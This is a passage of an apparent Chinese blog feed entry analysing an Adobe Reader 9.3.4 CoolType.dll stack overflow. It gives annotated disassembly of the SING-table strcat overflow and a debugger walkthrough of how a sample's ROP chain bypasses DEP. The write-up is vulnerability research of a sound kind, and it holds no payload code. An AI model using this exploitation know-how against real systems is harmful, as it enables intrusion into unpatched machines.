class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DCF9                 push    ebp</span><br><span class="line">.text:0803DCFA                 sub     esp, 104h       ; 分配栈空间0x104</span><br><span class="line">.text:0803DD00                 lea     ebp, [esp-4]    ; strcat的dest</span><br><span class="line">.text:0803DD04                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09                 xor     eax, ebp</span><br><span class="line">.text:0803DD0B                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11                 push    4Ch</span><br><span class="line">.text:0803DD13                 mov     eax, offset sub_8184A54</span><br><span class="line">.text:0803DD18                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35                 call    sub_804172C</span><br><span class="line">.text:0803DD3A                 xor     esi, esi</span><br><span class="line">.text:0803DD3C                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD40                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43                 jz      loc_803DF00</span><br><span class="line">.text:0803DD49                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57                 jnz     loc_803DEA9</span><br><span class="line">.text:0803DD5D                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62                 push    edi             ; int</span><br><span class="line">.text:0803DD63                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A                 call    sub_80217D7</span><br><span class="line">.text:0803DD6F                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72                 jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C] ; SING表的入口地址</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C] ; SING表的入口处的值</span><br><span class="line">.text:0803DD85                 cmp     eax, esi        ; 判断是否为NULL</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4 ; 为空则跳转</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax] ;字体版本资源号，这里是1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F ; 发生跳转</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *src</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *dest</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat          ; 造成溢出</span><br></pre></td></tr></table></figure><h2 id="4-动态分析"><a href="#4-动态分析" class="headerlink" title="4.动态分析"></a>4.动态分析</h2><p>使用Olldbg attach到Adobe Reader进程，寻找CoolType.dll中的位置在下图所示位置：</p><p><img src="OD1.png" alt=""></p><p>注意这里，之前断点一直没有触发，在网上找了好久，才找到如下解决方法：</p><p><img src="OD2.png" alt=""></p><p>打开样本触发断点：</p><p><img src="OD4.png" alt=""></p><p>继续执行，到造成溢出处断下，数据拷贝方向如下：</p><p><img src="OD5.png" alt=""></p><p>f8执行，栈空间已被覆盖：</p><p><img src="OD6.png" alt=""></p><p>参考漏洞战争，在这下个断点：</p><p><img src="OD7.png" alt=""></p><p>f7单步步入，在此处返回，ROP指令1：</p><p><img src="OD8.png" alt=""></p><p>ROP指令2：</p><p><img src="ROP1.png" alt=""></p><p>ROP指令3：</p><p><img src="ROP2.png" alt=""></p><p>ROP指令4：</p><p><img src="ROP4.png" alt=""></p><p>通过分析栈空间内容，可以分析处样本通过ROP技术调用了CreateFileA();</p><p>CreateFileMapping();</p><p>MapViewOfFile();</p><p>memcpy()</p><p>等一系列函数来绕过DEP保护。</p><p><img src="Createfile.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一、调试环境&quot;&gt;&lt;a href=&quot;#一、调试环境&quot; class=&quot;headerlink&quot; title=&quot;一、调试环境&quot;&gt;&lt;/a&gt;一、调试环境&lt;/h1&gt;&lt;p&gt;windows xp sp3中文版&lt;/p&gt;
&lt;p&gt;Adobe Reader (9.3.4)&lt;/p&gt;
&lt;p&gt;O
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
      <category term="Windows" scheme="http://yoursite.com/tags/Windows/"/>
    
  </entry>
  
</feed>
